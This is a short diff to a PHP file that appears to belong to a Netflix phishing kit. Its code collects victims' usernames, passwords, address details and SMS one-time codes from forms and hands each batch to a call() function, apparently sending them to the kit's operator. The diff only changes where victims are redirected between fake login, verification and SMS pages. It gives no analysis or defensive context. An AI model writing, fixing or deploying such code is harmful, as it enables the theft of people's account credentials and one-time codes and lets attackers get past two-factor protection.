@@ -6,7 +6,7 @@ if(isset($_POST['user'])){
 $msg = "/- Netflix Login -/
 ".$_POST['user']." | ".$_POST['pass'];
 call($msg);
-header("location: wait.php?next=verify.php");
+header("location: verify.php");
 
 }
 
@@ -27,7 +27,7 @@ Zip: " . ($_POST['zip'] ?? 'N/A') . "
 --------------------------
 ";
 call($msg);
-header("location: wait.php?next=sms.php");
+header("location: sms.php");
 }
 
     
@@ -44,7 +44,7 @@ Otp: ".$_POST['otp']."
 ";
 
 call($msg);
-header("location: wait.php?next=sms.php?error");
+header("location: sms.php?error");
 
 }
     
